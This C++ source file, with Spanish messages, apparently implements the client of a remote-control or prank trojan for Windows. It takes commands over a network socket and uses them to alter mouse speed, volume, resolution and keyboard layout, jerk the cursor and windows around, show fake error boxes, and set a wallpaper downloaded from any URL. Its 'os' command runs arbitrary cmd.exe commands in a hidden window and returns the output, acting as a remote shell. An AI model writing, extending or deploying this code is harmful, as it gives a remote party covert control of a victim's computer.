#include <filesystem>
#if _WIN32
#include <windows.h>
#endif
#include "Commands.hpp"
#include "Utils.cpp"
#include <curl/curl.h>
#include <string>

void Commands::processCommand(const char *command, const char *params) {
  this->acceptCommand(command, params);
}

void Commands::acceptCommand(const std::string command,
                             const std::string &params) {
  bool result = false;
  if (command == "mouse") {
    result = mouseCommand(params);
  } else if (command == "wallpaper") {
    result = wallpaperCommand(params);
  } else if (command == "os") {
    result = osCommand(params);
  } else if (command == "dialog") {
    result = dialogCommand(params);
  } else if (command == "volume") {
    result = volumeCommand(params);
  } else if (command == "mouse_move") {
    result = mouseMoveCommand(params);
  } else if (command == "minimize") {
    result = minimizeCommand(params);
  } else if (command == "resolution") {
    result = resolutionCommand(params);
  } else if (command == "keyboard") {
    result = keyboardCommand(params);
  } else if (command == "hide_mouse") {
    result = hideMouseCommand(params);
  } else if (command == "shake") {
    result = shakeCommand(params);
  } else {
    std::string response = "Comando desconocido";
    sendMessage(response);
    return;
  }

  if (!result)
    return;
  std::string response = "Success";
  sendMessage(response);
}

bool Commands::mouseCommand(const std::string &params) {
  try {
    int sensitivity = stoi(params);
    if (sensitivity < 1 || sensitivity > 20) {
      std::string response = "La sensibilidad debe estar entre 1 y 20";
      sendMessage(response);
      return false;
    }

#ifdef _WIN32
    if (!SystemParametersInfo(SPI_SETMOUSESPEED, 0,
                              (PVOID)(uintptr_t)sensitivity,
                              SPIF_UPDATEINIFILE | SPIF_SENDCHANGE)) {
      std::string response = "Error al establecer la sensibilidad del mouse";
      sendMessage(response);
      return false;
    }
#endif

  } catch (const std::invalid_argument &e) {
    std::string response = "Parametro invalido";
    sendMessage(response);
    return false;
  }
  return true;
}

bool Commands::downloadImage(const std::string &url,
                             const std::string &filePath) {
  CURL *curl;
  CURLcode res;

  std::ofstream outFile(filePath, std::ios::binary);
  if (!outFile) {
    std::cerr << "No se pudo abrir el archivo para escritura." << std::endl;
    return false;
  }

  curl = curl_easy_init();
  if (curl) {
    curl_easy_setopt(curl, CURLOPT_URL, url.c_str());
    curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, WriteCallback);
    curl_easy_setopt(curl, CURLOPT_WRITEDATA, &outFile);

    res = curl_easy_perform(curl);
    if (res != CURLE_OK) {
      outFile.close();
      return false;
    }

    curl_easy_cleanup(curl);
  }

  outFile.close();
  return true;
}

#ifdef _WIN32
inline void setWallpaper(const std::string &filePath) {
  std::filesystem::path absolutePath = std::filesystem::absolute(filePath);

  if (!SystemParametersInfo(SPI_SETDESKWALLPAPER, 0,
                            (PVOID)absolutePath.c_str(),
                            SPIF_UPDATEINIFILE | SPIF_SENDCHANGE)) {
    std::cerr << "Error al establecer el fondo de pantalla: " << GetLastError()
              << std::endl;
  }
}
#endif

bool Commands::wallpaperCommand(const std::string &params) {
  std::cout << params << std::endl;
  const std::string filePath = "./image.jpg";
  const bool downloaded = downloadImage(params, filePath);
  if (!downloaded) {
    std::string response = "Error en descargar imagen";
    sendMessage(response);
    return false;
  }

#ifdef _WIN32
  setWallpaper(filePath);
#endif

  return true;
}

bool Commands::dialogCommand(const std::string &params) {
#ifdef _WIN32
  return MessageBoxA(NULL, params.c_str(), "Error", MB_OK | MB_ICONERROR);
#endif

  return true;
}

bool Commands::osCommand(const std::string &params) {
#ifdef _WIN32
  std::string result;
  HANDLE hStdOutRead, hStdOutWrite;
  SECURITY_ATTRIBUTES sa = {sizeof(SECURITY_ATTRIBUTES), NULL, TRUE};

  if (!CreatePipe(&hStdOutRead, &hStdOutWrite, &sa, 0)) {
    return false;
  }

  STARTUPINFO si = {0};
  si.cb = sizeof(STARTUPINFO);
  si.dwFlags = STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW;
  si.hStdOutput = hStdOutWrite;
  si.hStdError = hStdOutWrite;
  si.wShowWindow = SW_HIDE;
  PROCESS_INFORMATION pi = {0};

  std::string command = "cmd.exe /c " + params;
  LPSTR commandLine = const_cast<LPSTR>(command.c_str());

  if (!CreateProcess(NULL, commandLine, NULL, NULL, TRUE, 0, NULL, NULL, &si,
                     &pi)) {
    CloseHandle(hStdOutWrite);
    CloseHandle(hStdOutRead);
    return false;
  }

  CloseHandle(hStdOutWrite);

  char buffer[128];
  DWORD bytesRead;
  while (ReadFile(hStdOutRead, buffer, sizeof(buffer) - 1, &bytesRead, NULL) &&
         bytesRead > 0) {
    buffer[bytesRead] = '\0';
    result += buffer;
  }

  CloseHandle(hStdOutRead);
  CloseHandle(pi.hProcess);
  CloseHandle(pi.hThread);

  sendMessage(result);
#endif
  return true;
}

bool Commands::volumeCommand(const std::string &params) {
  try {
    int value = stoi(params);
    if (value < 0 || value > 100) {
      sendMessage("La sensibilidad debe estar entre el 0 y 100");
      return false;
    }

#ifdef _WIN32
    float volume = static_cast<float>(value) / 100;
    CoInitialize(NULL);
    IMMDeviceEnumerator *deviceEnumerator = NULL;
    CoCreateInstance(__uuidof(MMDeviceEnumerator), NULL, CLSCTX_ALL,
                     __uuidof(IMMDeviceEnumerator), (void **)&deviceEnumerator);

    IMMDevice *defaultDevice = NULL;
    deviceEnumerator->GetDefaultAudioEndpoint(eRender, eConsole,
                                              &defaultDevice);

    IAudioEndpointVolume *endpointVolume = NULL;
    defaultDevice->Activate(__uuidof(IAudioEndpointVolume), CLSCTX_ALL, NULL,
                            (void **)&endpointVolume);

    endpointVolume->SetMasterVolumeLevelScalar(volume, NULL);

    endpointVolume->Release();
    defaultDevice->Release();
    deviceEnumerator->Release();
    CoUninitialize();
#endif
  } catch (const std::invalid_argument &e) {
    sendMessage("Parametro invalido");
    return false;
  }
  return true;
}

bool Commands::mouseMoveCommand(const std::string &params) {
  try {
    int value = stoi(params);
    if (value < 0 || value > 10) {
      sendMessage("La sensibilidad debe estar entre el 0 y 10");
      return false;
    }

#ifdef _WIN32
    POINT cursorPos;
    srand(static_cast<unsigned int>(time(nullptr)));

    DWORD endTime = GetTickCount() + (value * 1000);
    int screenWidth = GetSystemMetrics(SM_CXSCREEN);
    int screenHeight = GetSystemMetrics(SM_CYSCREEN);

    while (GetTickCount() < endTime) {
      if (GetCursorPos(&cursorPos)) {
        int randomX = rand() % screenWidth;
        int randomY = rand() % screenHeight;

        SetCursorPos(randomX, randomY);
        Sleep(100);
      }
    }
#endif
  } catch (const std::invalid_argument &e) {
    sendMessage("Parametro invalido");
    return false;
  }
  return true;
}

bool Commands::minimizeCommand(const std::string &params) {
#if _WIN32
  HWND hwnd = GetForegroundWindow();
  ShowWindow(hwnd, SW_MINIMIZE);
#endif
  return true;
}

bool Commands::resolutionCommand(const std::string &params) {
#if _WIN32
  int width = 0;
  int height = 0;

  std::stringstream ss;
  ss << params;
  std::string token;

  if (std::getline(ss, token, 'x')) {
    width = std::stoi(token);
  } else {
    sendMessage("Resolucion no valida");
    return false;
  }

  if (std::getline(ss, token)) {
    height = std::stoi(token);
  } else {
    sendMessage("Resolucion no valida");
    return false;
  }

  DEVMODE devMode;
  devMode.dmSize = sizeof(devMode);
  devMode.dmPelsWidth = width;
  devMode.dmPelsHeight = height;
  devMode.dmFields = DM_PELSWIDTH | DM_PELSHEIGHT;

  if (ChangeDisplaySettings(&devMode, CDS_TEST) != DISP_CHANGE_SUCCESSFUL) {
    sendMessage("Resolucion no valida");
    return false;
  }

  ChangeDisplaySettings(&devMode, 0);
#endif
  return true;
}

bool Commands::keyboardCommand(const std::string &params) {
#if _WIN32
  HKL layout = LoadKeyboardLayout(params.c_str(), KLF_SETFORPROCESS);

  if (layout == NULL) {
    sendMessage("Error al cambiar el diseño del teclado.");
  }
#endif
  return true;
}

bool Commands::hideMouseCommand(const std::string &params) {
#if _WIN32
  cursorHidden = !cursorHidden;
  ShowCursor(!cursorHidden);
#endif
  return true;
}

bool Commands::shakeCommand(const std::string &params) {
#if _WIN32
  HWND hwnd = GetForegroundWindow();
  RECT rect;
  GetWindowRect(hwnd, &rect);
  int posX = rect.left;
  int posY = rect.top;

  for (int i = 0; i < 20; ++i) {
    SetWindowPos(hwnd, NULL, posX + rand() % 10 - 5, posY + rand() % 10 - 5, 0,
                 0, SWP_NOSIZE | SWP_NOZORDER);
    Sleep(50);
  }
#endif
  return true;
}

void Commands::sendMessage(const std::string response) {
  send(clientSocket, response.c_str(), response.length(), 0);
}
